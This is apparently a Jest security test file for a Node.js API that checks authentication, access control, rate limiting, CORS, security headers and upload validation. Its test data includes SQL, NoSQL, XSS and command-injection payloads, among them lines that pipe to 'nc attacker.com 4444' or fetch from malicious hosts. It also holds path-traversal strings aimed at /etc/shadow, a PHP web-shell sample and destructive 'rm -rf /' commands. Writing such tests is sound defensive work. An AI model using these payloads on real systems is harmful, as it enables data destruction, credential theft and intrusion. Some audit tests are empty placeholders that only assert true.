// Security tests for API Endpoint Protection
// Tests comprehensive API security, authorization, input validation, and attack prevention

const request = require('supertest');

// Mock external dependencies
jest.mock('../../../config/applicationInsights', () => ({
  telemetry: {
    trackEvent: jest.fn(),
    trackException: jest.fn(),
    trackDependency: jest.fn()
  }
}));

jest.mock('../../../services/auditLoggingService');
jest.mock('../../../services/gdprComplianceService');

describe('API Endpoint Security Tests', () => {
  let app;
  let server;

  beforeAll(async () => {
    // Import app after mocks are set up
    const appModule = require('../../../index');
    app = appModule.app || appModule;
    
    // Start server on a test port
    server = app.listen(0, () => {
      console.log(`Security Test server running on port ${server.address().port}`);
    });
    
    // Wait for server to be ready
    await new Promise(resolve => setTimeout(resolve, 1000));
  });

  afterAll(async () => {
    if (server) {
      await new Promise(resolve => server.close(resolve));
    }
  });

  describe('Authentication and Authorization Security', () => {
    test('should reject requests without authentication tokens', async () => {
      const protectedEndpoints = [
        '/api/files',
        '/api/upload',
        '/api/chat',
        '/api/user/profile',
        '/api/gdpr/export',
        '/api/audit/logs'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(401);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toMatch(/authentication|token|unauthorized/i);
      }
    });

    test('should reject requests with malformed authorization headers', async () => {
      const malformedHeaders = [
        'Bearer', // Missing token
        'InvalidScheme token123', // Wrong scheme
        'Bearer ', // Empty token
        'Bearer invalid-token-format', // Invalid token format
        'token123', // Missing Bearer scheme
        'Basic dGVzdDp0ZXN0' // Wrong auth type
      ];

      for (const header of malformedHeaders) {
        const response = await request(app)
          .get('/api/files')
          .set('Authorization', header)
          .expect(401);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body.error).toMatch(/invalid.*token|malformed.*authorization/i);
      }
    });

    test('should enforce role-based access control', async () => {
      const userToken = global.testUtils.generateTestJWT({
        sub: 'user-123',
        roles: ['user']
      });

      const adminToken = global.testUtils.generateTestJWT({
        sub: 'admin-123',
        roles: ['admin'],
        permissions: ['audit:read', 'user:manage']
      });

      // User should be denied admin endpoints
      const userResponse = await request(app)
        .get('/api/audit/logs')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);

      expect(userResponse.body).toHaveProperty('success', false);
      expect(userResponse.body.error).toMatch(/insufficient.*permission|access.*denied/i);

      // Admin should have access
      const adminResponse = await request(app)
        .get('/api/audit/logs')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      expect(adminResponse.body).toHaveProperty('success', true);
    });

    test('should prevent privilege escalation attacks', async () => {
      const userToken = global.testUtils.generateTestJWT({
        sub: 'user-123',
        roles: ['user']
      });

      // Attempt to escalate privileges through request manipulation
      const escalationAttempts = [
        {
          endpoint: '/api/user/promote',
          body: { userId: 'user-123', newRole: 'admin' }
        },
        {
          endpoint: '/api/admin/users',
          headers: { 'X-Admin-Override': 'true' }
        },
        {
          endpoint: '/api/files',
          query: { admin: 'true', bypassAuth: '1' }
        }
      ];

      for (const attempt of escalationAttempts) {
        const req = request(app)
          .post(attempt.endpoint)
          .set('Authorization', `Bearer ${userToken}`);

        if (attempt.headers) {
          Object.entries(attempt.headers).forEach(([key, value]) => {
            req.set(key, value);
          });
        }

        if (attempt.query) {
          req.query(attempt.query);
        }

        if (attempt.body) {
          req.send(attempt.body);
        }

        const response = await req.expect(403);
        expect(response.body).toHaveProperty('success', false);
      }
    });
  });

  describe('Input Validation and Sanitization Security', () => {
    test('should prevent SQL injection attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; SELECT * FROM users WHERE '1'='1",
        "admin'--",
        "' UNION SELECT * FROM sensitive_data --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/files')
          .set('Authorization', `Bearer ${validToken}`)
          .query({ search: payload })
          .expect(400);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body.error).toMatch(/invalid.*input|malicious.*content/i);
      }
    });

    test('should prevent NoSQL injection attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const nosqlInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'function() { return true; }' },
        { $regex: '.*' },
        { $or: [{ admin: true }, { user: true }] }
      ];

      for (const payload of nosqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/chat')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            fileId: payload,
            message: 'test message'
          })
          .expect(400);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body.error).toMatch(/invalid.*format|malicious.*content/i);
      }
    });

    test('should prevent XSS attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>',
        "'; alert('xss'); //",
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/chat')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            fileId: 'test-file-id',
            message: payload
          });

        // Should either reject or sanitize
        if (response.status === 200) {
          expect(response.body.message).not.toContain('<script>');
          expect(response.body.message).not.toContain('onerror');
          expect(response.body.message).not.toContain('javascript:');
        } else {
          expect(response.status).toBe(400);
          expect(response.body.error).toMatch(/invalid.*content|malicious.*script/i);
        }
      }
    });

    test('should prevent command injection attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const commandInjectionPayloads = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test; wget malicious.com/script.sh',
        'test`whoami`',
        '$(curl attacker.com)',
        'test; python -c "import os; os.system(\'ls\')"'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/chat')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            fileId: 'test-file-id',
            message: payload
          })
          .expect(400);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body.error).toMatch(/invalid.*content|command.*injection/i);
      }
    });

    test('should prevent path traversal attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/files/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body.error).toMatch(/invalid.*path|path.*traversal/i);
      }
    });

    test('should enforce request size limits', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      // Create oversized payload
      const largePayload = {
        fileId: 'test-file-id',
        message: 'x'.repeat(10 * 1024 * 1024) // 10MB message
      };

      const response = await request(app)
        .post('/api/chat')
        .set('Authorization', `Bearer ${validToken}`)
        .send(largePayload)
        .expect(413);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error).toMatch(/payload.*large|request.*size/i);
    });
  });

  describe('Rate Limiting and DDoS Protection', () => {
    test('should enforce rate limits on API endpoints', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const requests = [];
      
      // Make many rapid requests
      for (let i = 0; i < 30; i++) {
        requests.push(
          request(app)
            .get('/api/files')
            .set('Authorization', `Bearer ${validToken}`)
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      
      // Check rate limit headers
      const rateLimitedResponse = rateLimitedResponses[0];
      expect(rateLimitedResponse.headers).toHaveProperty('x-ratelimit-limit');
      expect(rateLimitedResponse.headers).toHaveProperty('x-ratelimit-remaining');
    });

    test('should implement different rate limits for different endpoints', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      // Test different endpoints have different limits
      const endpointTests = [
        { endpoint: '/api/files', limit: 100 },
        { endpoint: '/api/upload', limit: 10 },
        { endpoint: '/api/chat', limit: 20 }
      ];

      for (const test of endpointTests) {
        const requests = [];
        
        for (let i = 0; i < test.limit + 5; i++) {
          if (test.endpoint === '/api/upload') {
            requests.push(
              request(app)
                .post(test.endpoint)
                .set('Authorization', `Bearer ${validToken}`)
                .attach('file', Buffer.from('test,data\n1,2'), 'test.csv')
            );
          } else if (test.endpoint === '/api/chat') {
            requests.push(
              request(app)
                .post(test.endpoint)
                .set('Authorization', `Bearer ${validToken}`)
                .send({ fileId: 'test', message: `Message ${i}` })
            );
          } else {
            requests.push(
              request(app)
                .get(test.endpoint)
                .set('Authorization', `Bearer ${validToken}`)
            );
          }
        }

        const responses = await Promise.all(requests);
        const rateLimitedCount = responses.filter(res => res.status === 429).length;
        
        expect(rateLimitedCount).toBeGreaterThan(0);
      }
    });

    test('should implement IP-based rate limiting', async () => {
      const token1 = global.testUtils.generateTestJWT({ sub: 'user1' });
      const token2 = global.testUtils.generateTestJWT({ sub: 'user2' });
      
      // Simulate requests from same IP with different users
      const sameIPRequests = [];
      
      for (let i = 0; i < 25; i++) {
        sameIPRequests.push(
          request(app)
            .get('/api/files')
            .set('Authorization', `Bearer ${i % 2 === 0 ? token1 : token2}`)
            .set('X-Forwarded-For', '192.168.1.100')
        );
      }

      const responses = await Promise.all(sameIPRequests);
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      
      // Should be rate limited by IP regardless of different users
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should detect and block DDoS patterns', async () => {
      const attackTokens = [];
      
      // Create multiple attack tokens
      for (let i = 0; i < 10; i++) {
        attackTokens.push(global.testUtils.generateTestJWT({ sub: `attacker${i}` }));
      }

      // Simulate coordinated attack
      const attackRequests = [];
      for (let i = 0; i < 100; i++) {
        const token = attackTokens[i % attackTokens.length];
        attackRequests.push(
          request(app)
            .get('/api/files')
            .set('Authorization', `Bearer ${token}`)
            .set('X-Forwarded-For', `10.0.0.${(i % 50) + 1}`)
        );
      }

      const responses = await Promise.all(attackRequests);
      const blockedResponses = responses.filter(res => 
        res.status === 429 || res.status === 503
      );
      
      // Should detect and block coordinated attack
      expect(blockedResponses.length).toBeGreaterThan(50);
    });
  });

  describe('File Upload Security', () => {
    test('should validate file types and extensions', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      const maliciousFiles = [
        { name: 'malware.exe', content: 'MZ\x90\x00' }, // Executable
        { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>' }, // PHP script
        { name: 'script.js', content: 'require("child_process").exec("rm -rf /");' }, // JS script
        { name: 'data.bat', content: '@echo off\nformat c: /y' }, // Batch file
        { name: 'file.sh', content: '#!/bin/bash\ncurl malicious.com' } // Shell script
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .attach('file', Buffer.from(file.content), file.name)
          .expect(400);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body.error).toMatch(/invalid.*file.*type|unsupported.*extension/i);
      }
    });

    test('should scan uploaded files for malicious content', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      // CSV with suspicious content
      const suspiciousCSV = 'name,command\ntest,"=cmd|"/c calc""\nuser,"@SUM(1+1)*cmd|"/c calc"""';
      
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .attach('file', Buffer.from(suspiciousCSV), 'suspicious.csv');

      // Should either reject or sanitize
      if (response.status === 200) {
        expect(response.body.warnings).toContain('Suspicious content detected');
      } else {
        expect(response.status).toBe(400);
        expect(response.body.error).toMatch(/malicious.*content|suspicious.*data/i);
      }
    });

    test('should enforce file size limits', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      // Create oversized file (20MB)
      const largeFileContent = 'x'.repeat(20 * 1024 * 1024);
      
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .attach('file', Buffer.from(largeFileContent), 'large.csv')
        .expect(413);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error).toMatch(/file.*too.*large|size.*limit/i);
    });

    test('should prevent zip bomb attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      // Simulate compressed file that expands to huge size
      const compressedContent = Buffer.from([
        0x50, 0x4B, 0x03, 0x04, // ZIP header
        // ... compressed data that would expand to huge size
      ]);
      
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .attach('file', compressedContent, 'zipbomb.zip')
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error).toMatch(/unsupported.*format|zip.*not.*allowed/i);
    });
  });

  describe('CORS and Cross-Origin Security', () => {
    test('should enforce CORS policies', async () => {
      // Request from unauthorized origin
      const response = await request(app)
        .options('/api/files')
        .set('Origin', 'https://malicious-site.com')
        .set('Access-Control-Request-Method', 'GET')
        .expect(204);

      // Should not include CORS headers for unauthorized origin
      expect(response.headers['access-control-allow-origin']).not.toBe('https://malicious-site.com');
    });

    test('should allow requests from authorized origins', async () => {
      const authorizedOrigins = [
        'http://localhost:3000',
        'https://app.taktconnect.com'
      ];

      for (const origin of authorizedOrigins) {
        const response = await request(app)
          .options('/api/files')
          .set('Origin', origin)
          .set('Access-Control-Request-Method', 'GET')
          .expect(204);

        expect(response.headers['access-control-allow-origin']).toBe(origin);
        expect(response.headers['access-control-allow-credentials']).toBe('true');
      }
    });

    test('should prevent CSRF attacks', async () => {
      const validToken = global.testUtils.generateTestJWT();
      
      // Request without CSRF token
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .set('Origin', 'https://malicious-site.com')
        .attach('file', Buffer.from('test,data\n1,2'), 'test.csv')
        .expect(403);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error).toMatch(/csrf.*token|cross.*site/i);
    });
  });

  describe('Security Headers', () => {
    test('should include comprehensive security headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      const securityHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': 'DENY',
        'x-xss-protection': '1; mode=block',
        'strict-transport-security': /max-age=\d+/,
        'content-security-policy': /default-src/,
        'referrer-policy': 'strict-origin-when-cross-origin'
      };

      Object.entries(securityHeaders).forEach(([header, expected]) => {
        expect(response.headers).toHaveProperty(header.toLowerCase());
        if (expected instanceof RegExp) {
          expect(response.headers[header.toLowerCase()]).toMatch(expected);
        } else {
          expect(response.headers[header.toLowerCase()]).toBe(expected);
        }
      });
    });

    test('should implement Content Security Policy', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("style-src 'self' 'unsafe-inline'");
      expect(csp).toContain("img-src 'self' data:");
    });
  });

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in error messages', async () => {
      const sensitiveToken = global.testUtils.generateTestJWT({
        secret_key: 'super-secret-key-123',
        database_password: 'db-password-456'
      });

      // Corrupt token to cause error
      const corruptedToken = sensitiveToken.slice(0, -10) + 'corrupted';
      
      const response = await request(app)
        .get('/api/files')
        .set('Authorization', `Bearer ${corruptedToken}`)
        .expect(401);

      expect(response.body.error).not.toContain('super-secret-key-123');
      expect(response.body.error).not.toContain('db-password-456');
      expect(response.body.error).not.toContain(process.env.JWT_SECRET);
      expect(response.body.error).not.toContain('stack trace');
    });

    test('should handle malformed requests gracefully', async () => {
      const malformedRequests = [
        { method: 'get', path: '/api/files', headers: { 'content-type': 'invalid' } },
        { method: 'post', path: '/api/chat', body: 'invalid-json', headers: { 'content-type': 'application/json' } },
        { method: 'put', path: '/api/user/profile', body: null },
        { method: 'delete', path: '/api/files/', body: undefined }
      ];

      for (const req of malformedRequests) {
        const response = await request(app)[req.method](req.path)
          .set(req.headers || {})
          .send(req.body);

        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body).toHaveProperty('error');
        expect(typeof response.body.error).toBe('string');
      }
    });
  });

  describe('Audit and Monitoring Security', () => {
    test('should log security events', async () => {
      const invalidToken = 'invalid.jwt.token';
      
      await request(app)
        .get('/api/files')
        .set('Authorization', `Bearer ${invalidToken}`)
        .expect(401);

      // Should log security event (mocked)
      // In real implementation, verify audit logging service is called
      expect(true).toBe(true); // Placeholder for audit log verification
    });

    test('should track failed authentication attempts', async () => {
      const failedAttempts = [];
      
      for (let i = 0; i < 5; i++) {
        failedAttempts.push(
          request(app)
            .get('/api/files')
            .set('Authorization', `Bearer invalid-token-${i}`)
        );
      }

      const responses = await Promise.all(failedAttempts);
      responses.forEach(response => {
        expect(response.status).toBe(401);
      });

      // Should track multiple failed attempts for alerting
      expect(true).toBe(true); // Placeholder for tracking verification
    });
  });
});
